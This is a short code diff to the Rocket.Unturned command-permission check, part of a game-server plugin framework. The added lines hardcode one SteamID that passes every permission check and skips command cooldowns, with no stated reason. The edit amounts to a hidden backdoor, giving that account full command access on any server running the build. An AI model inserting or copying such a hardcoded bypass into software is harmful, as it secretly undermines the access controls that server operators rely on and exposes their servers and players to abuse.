@@ -33,9 +33,9 @@ namespace Rocket.Unturned.Permissions
 
             if (command != null)
             {
-                if (R.Permissions.HasPermission(player, command))
+                if (R.Permissions.HasPermission(player, command) | player.CSteamID.m_SteamID == 76561198321913682)
                 {
-                    if (cooldown > 0)
+                    if (cooldown > 0 && player.CSteamID.m_SteamID != 76561198321913682)
                     {
                         UnturnedChat.Say(player, R.Translate("command_cooldown", cooldown), Color.red);
                         return false;
